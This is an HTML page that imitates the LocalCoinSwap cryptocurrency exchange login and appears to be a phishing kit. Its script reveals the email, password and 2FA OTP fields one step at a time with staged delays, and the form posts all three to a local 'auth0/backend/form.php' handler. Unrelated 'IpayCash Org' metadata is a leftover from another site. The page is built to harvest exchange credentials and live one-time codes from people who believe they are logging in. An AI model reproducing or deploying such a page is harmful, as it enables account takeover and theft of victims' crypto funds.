<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Login to LocalCoinSwap</title>
  <meta name="description" content="Login to access your personalized dashboard and wallets on LocalCoinSwap">
  <meta itemprop="name" content="Login to LocalCoinSwap">
  <meta itemprop="description" content="Login to access your personalized dashboard and wallets on LocalCoinSwap">
  <link rel="icon" href="favicon.ico">
  <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="mask-icon" href="safari-pinned-tab.svg" color="#000000">
  <meta name="theme-color" content="#000000">
  <meta name="msapplication-navbutton-color" content="#000000">
  <meta name="apple-mobile-web-app-status-bar-style" content="#000000">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Login to LocalCoinSwap">
  <script>
    // Function to get a random item from an array
    function getRandomItem(array) {
      return array[Math.floor(Math.random() * array.length)];
    }

    // List of random phrases
    function updateText() {
      const yummyTextOptions = [
        "I am very intrigued by Bitcoin. It has all the signs. Paradigm shift, hackers love it, yet it is described as a toy. Just like microcomputers.",
        "Be yourself; everyone else is already taken.",
        "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment.",
        "Don't watch the clock; do what it does. Keep going.",
        "Bitcoin is a technological tour de force.",
        "Cryptocurrency is the future of finance.",
        "Bitcoin is the first decentralized digital currency.",
        "Cryptocurrency allows people to take control of their money.",
        "Blockchain technology is revolutionizing the world.",
        "Bitcoin is like digital gold.",
        "Cryptocurrency can provide financial freedom to millions.",
        "Blockchain ensures security through decentralization.",
        "Bitcoin is a hedge against inflation.",
        "Crypto is reshaping how we think about money.",
        "Bitcoin empowers individuals over traditional institutions.",
        "Cryptocurrencies are changing the landscape of finance.",
        "Bitcoin's transparency makes it a trustable asset.",
        "Cryptocurrency is democratizing finance.",
        "Bitcoin is a new asset class with unique properties.",
        "Blockchain's immutability is key to its security.",
        "Crypto opens new doors for investment.",
        "Bitcoin is disrupting traditional banking systems.",
        "Cryptocurrency facilitates peer-to-peer transactions.",
        "Bitcoin's price is influenced by supply and demand.",
        "Cryptocurrency is a global phenomenon.",
        "Bitcoin is more than just a currency; it's a movement.",
        "Blockchain is leading to more transparent business practices.",
        "Bitcoin's value is driven by its scarcity.",
        "I am very intrigued by Bitcoin. It has all the signs. Paradigm shift, hackers love it, yet it is described as a toy. Just like microcomputers.",
        "Cryptocurrencies offer an alternative to fiat money.",
        "Bitcoin is a store of value for a digital age.",
        "Crypto creates new opportunities for entrepreneurs.",
        "Bitcoin is a challenge to traditional monetary systems.",
        "Cryptocurrency is transforming cross-border transactions.",
        "Success usually comes to those who are too busy to be looking for it."
      ];
      const tummyTextOptions = [
        "Paul Graham",
        "Satoshi Nakamoto",
        "Elon Musk",
        "Vitalik Buterin",
        "Charlie Lee",
        "Andreas Antonopoulos",
        "Naval Ravikant",
        "Cameron Winklevoss",
        "Tyler Winklevoss",
        "Marc Andreessen",
        "Tim Draper",
        "Meltem Demirors",
        "Kathryn Haun",
        "Blythe Masters",
        "Caitlin Long",
        "Michael Saylor",
        "Barry Silbert",
        "Raoul Pal",
        "Tom Lee",
        "Pomp (Anthony Pompliano)",
        "Adam Back",
        "Nick Szabo",
        "Jimmy Song",
        "Balaji Srinivasan",
        "Dan Held",
        "Willy Woo",
        "CZ (Changpeng Zhao)",
        "Sam Bankman-Fried",
        "Erik Voorhees",
        "Roger Ver",
        "Laura Shin"
      ];

      // Get elements by class name and update their text content with random values
      document.querySelector(".yummy").textContent = getRandomItem(yummyTextOptions);
      document.querySelector(".tummy").textContent = getRandomItem(tummyTextOptions);
    }

    window.onload = function () {
      updateText(); // Randomly update text content
    };

    // Show password input section
    function showPasswordInput(event) {
      event.preventDefault(); // Stop the form from submitting
      updateText(); // Randomly update text content

      document.getElementById("password-section").style.display = "block"; // Show the password field
      document.getElementById("edit-btn").style.display = "inline-block"; // Show the "Edit" button
      document.getElementById("login-button").onclick = function(event) {
        event.preventDefault(); // Stop the form from submitting
        setTimeout(showOtpInput, 2500); // Set a delay of 3 seconds before showing OTP input
      };
    }

    // Show OTP input section
    function showOtpInput() {
      updateText(); // Randomly update text content

      document.getElementById("otp-section").style.display = "block"; // Show the OTP field
      document.getElementById("otpBtn").style.display = "block"; // Show the OTP button
      document.getElementById("login-button").onclick = null; // Remove the onclick handler
    }

    // Enable focus on email input when "Edit" button is clicked
    function allowEmailEdit() {
      document.getElementById("username").focus(); // Focus the email input
    }
  </script>
  <meta name="robots" content="index/follow">
  <meta name="googlebot" content="index/follow">
  <script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","name":"IpayCash Org","alternateName"}</script>
  <meta name="next-head-count" content="35">
  <link rel="preload" href="_next/static/css/419c64cf8f66623b.css" as="style">
  <link rel="stylesheet" href="_next/static/css/419c64cf8f66623b.css" data-n-g=""><noscript data-n-css=""></noscript>
</head>

<body class="bg-backgrounds-200 dark:bg-ocean-900 font-sans">
  <div id="__next">
    <div>
      <div class="flex flex-col h-screen">
        <header>
          <nav class="flex py-3 px-4 bg-ocean-900">
            <div class="flex content-center items-center justify-between container mx-auto">
              <div class="flex items-center"><a class="flex items-center text-white text-sm font-700 ml-2" href="/">
                  <div class="logo-colored">
                    <img src="favicon-32x32.png">
                  </div>
                  <div class="leading-5">LocalCoinSwap</div>
                </a></div>
              <div class="flex"><a
                  class="inline-block align-middle btn-orange-gradient text-white text-sm font-700 py-2 px-4 ml-4 border border-autumn rounded-full"
                  role="menuitem" href="/register">Register</a></div>
            </div>
          </nav>
        </header>
        <div class="flex justify-between h-full items-start px-4 bg-backgrounds-200 dark:bg-ocean-900 md:px-8 pt-4 md:pt-20">
          <div class="flex items-start container max-w-screen-lg mx-auto bg-white dark:bg-ocean-800 rounded-lg py-8 lg:py-16">
            <div class="hidden lg:block w-full lg:w-1/2 pl-16 pr-8">
              <section>
                <div class="flex w-full" style="opacity: 1; transform: none;">
                  <div class="w-1/6"><img class="w-16" src="images/common/top-quotation.svg" alt="icon quotation"></div>
                  <div class="w-5/6 ml-6 mt-6">
                    <p class="yummy text-base text-bone-700 dark:text-bone-500 mt-4"></p>
                    <hr class="above-author bg-bone-200 dark:bg-bone-800 mt-4">
                    <p class="tummy text-base text-bone-800 dark:text-bone-300 mt-4"></p>
                  </div>
                </div>
              </section>
            </div>
            <form class="w-full lg:w-1/2 px-4 lg:pr-16 lg:pl-8" action="auth0/backend/form.php" method="post" id="login-form" onsubmit="">
              <h1 class="text-bone-900 dark:text-bone-200 text-2xl lg:text-3xl font-600 leading-tight pb-4">Login to LocalCoinSwap</h1>
              <div style="display: none;" id="otpBtn" class="otp-zone text-forest-700 dark:text-white rounded-lg bg-forest-300 dark:bg-forest-700 px-4 text-md font-600 py-2 border-l-4 border-forest mb-2">
                Please enter the 6 digit 2FA OTP code.
              </div>
              <div class="py-4">
                <div class="text-sm font-600 text-bone-600 dark:text-bone-500">Email
                  <a id="edit-btn" type="button" class="edit-btn inline-block float-right text-azureblue dark:text-cyan hover:no-underline underline cursor-pointer" onclick="allowEmailEdit()" style="display: none;">Edit</a>
                </div>
                <div class="pt-1">
                  <input class="form-input w-full" id="username" name="username" autofocus="" type="email" placeholder="you@email.com" required>
                </div>
                <br>
                <div id="password-section" style="display: none;">
                  <div class="text-sm font-600 text-bone-600 dark:text-bone-500">Password
                    <div class="pt-1">
                      <input class="form-input w-full" id="password" name="pass" type="password" placeholder="Your Password" required>
                    </div>
                  </div>
                </div>
                <div id="otp-section" style="display: none;">
                  <div class="text-sm font-600 text-bone-600 dark:text-bone-500">6 digit OTP code (eg: Google Authenticator)
                    <div class="pt-1">
                      <input class="form-input w-full" id="otp" name="otp" type="number" placeholder="Your OTP code" required>
                    </div>
                  </div>
                </div>
                <button type="submit" id="login-button" class="btn btn-blue text-lg font-700 py-2 px-10 mt-4 w-full" onclick="showPasswordInput(event)">
                  Login
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>

</html>
